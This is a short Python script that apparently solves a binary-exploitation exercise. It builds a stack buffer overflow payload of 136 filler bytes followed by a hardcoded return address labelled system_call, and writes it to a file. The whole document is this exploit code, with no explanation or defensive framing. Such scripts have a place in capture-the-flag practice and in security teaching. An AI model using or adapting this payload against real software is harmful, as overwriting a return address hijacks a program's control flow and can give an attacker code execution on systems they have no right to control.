#!/usr/bin/env python3

# 7ffff7e1f860
system_call = b'\x7f\xff\xf7\xe1\xf8\x60'[::-1]
payload = b'a'*(136)+system_call

f = open('payload', 'wb')
f.write(payload)
